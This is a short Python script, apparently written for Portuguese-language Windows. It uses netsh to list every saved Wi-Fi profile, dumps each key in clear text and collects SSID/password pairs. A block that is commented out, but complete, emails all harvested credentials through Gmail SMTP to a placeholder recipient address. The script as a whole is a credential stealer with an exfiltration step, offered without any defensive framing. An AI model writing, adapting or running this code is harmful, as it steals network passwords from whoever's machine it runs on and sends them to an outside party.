# -*- coding: utf-8 -*-
import subprocess
import re

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode(errors='ignore')
print(command_output)
profile_names = (re.findall('Todos os Perfis de Usurios: (.*)\r', command_output))

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", str(name).encode('utf-8')], capture_output = True).stdout.decode(errors='ignore')
        
        if re.search("Chave de segurana           : Ausente", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name

            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", str(name), "key=clear"], capture_output = True).stdout.decode(errors='ignore')
            
            password = re.search("Contedo da Chave            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            
            wifi_list.append(wifi_profile)


for x in range(len(wifi_list)):
    print(wifi_list[x])

'''

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessage()
# Who is the email from
email["from"] = "name_of_sender"
# To which email you want to send the email
email["to"] = "email_address"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    smtp.login("login_name", "password")
    # Send email.
    smtp.send_message(email)

'''
